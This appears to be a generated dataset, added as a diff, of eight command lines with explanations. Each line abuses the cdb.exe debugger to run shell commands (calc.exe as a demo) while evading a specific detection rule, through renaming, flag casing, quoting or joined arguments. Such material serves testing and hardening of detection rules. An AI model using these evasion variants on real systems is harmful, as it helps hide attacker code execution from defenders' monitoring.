@@ -1,0 +1,34 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\cdb.exe C:\\Users\\Public\\not_a_debugger.exe && C:\\Users\\Public\\not_a_debugger.exe -cf script.txt",
+    "explanation": "The rule uses 'selection_img' with 'Image|endswith' or 'OriginalFileName'. By copying 'cdb.exe' to a new filename, the 'Image|endswith' check is bypassed. If the SIEM or EDR does not capture or prioritize the 'OriginalFileName' field (which stays 'CDB.Exe'), the renamed execution will not trigger the 'all of selection*' condition."
+  },
+  {
+    "output": "cdb.exe -C \"!shell calc.exe\"",
+    "explanation": "The rule explicitly checks for ' -c ' or ' -cf ' (lowercase). In many command-line parsers, flags are case-insensitive. Using a capital '-C' or '-CF' would bypass the literal string match 'CommandLine|contains' defined in the 'selection_cli' section while still being interpreted by the binary as the command script flag."
+  },
+  {
+    "output": "cdb.exe \"-cf\" script.txt",
+    "explanation": "The rule looks for the string ' -c ' or ' -cf ' with surrounding spaces. By wrapping the argument in quotes (e.g., \"-cf\"), the literal string match may fail depending on how the SIEM tokenizes the command line, as the character sequence no longer strictly matches the pattern ' -cf '."
+  },
+  {
+    "output": "cdb.exe -lines 10 -cfC:\\path\\to\\script.txt calc.exe",
+    "explanation": "The detection logic relies on a trailing and leading space structure for the execution flag (' -cf '). By squeezing the script path or alternative flags right next to the argument token without a space (e.g., '-cfC:\\path\\...'), cdb.exe still reads the argument correctly, but the string search logic fails to trigger."
+  },
+  {
+    "output": "copy C:\\DebuggingTools\\cdb.exe C:\\Windows\\Tasks\\not_cdb.exe && C:\\Windows\\Tasks\\not_cdb.exe -c \".shell calc.exe\" notepad.exe",
+    "explanation": "The rule uses 'all of selection*' logic, requiring the process image name or original filename header metadata to match 'cdb.exe'. If the executable binary is instead copied to an alternate low-privilege writable directory under an arbitrary file name, the 'selection_img' block yields a false evaluation result."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\cdb.exe %TEMP%\\not_a_debugger.exe && %TEMP%\\not_a_debugger.exe -cf script.txt",
+    "explanation": "The rule relies on 'selection_img' which checks if the process Image ends with '\\cdb.exe' or has the OriginalFileName 'CDB.Exe'. While OriginalFileName is harder to spoof, many SIEM configurations or EDR logs do not consistently populate or index the OriginalFileName field. By renaming the binary to 'not_a_debugger.exe', the first condition of 'selection_img' is bypassed."
+  },
+  {
+    "output": "cdb.exe -command \"!shell calc.exe\"",
+    "explanation": "The rule specifically looks for the short-form flags ' -c ' or ' -cf ' in the CommandLine. The CDB debugger also accepts the full-word parameter '-command' or the script file parameter '-cmdline'. Using the full parameter name instead of the shorthand flag avoids the string-based detection in 'selection_cli'."
+  },
+  {
+    "output": "cdb.exe -lines -c:\"!shell calc.exe\"",
+    "explanation": "The detection logic searches for ' -c ' (with spaces). In Windows command-line parsing, flags can often be joined with colons or other characters. By using '-c:\"command\"' or adding an unrelated flag like '-lines' immediately before the command flag, the specific 'space-dash-c-space' pattern is broken while the command remains functional."
+  }
+]
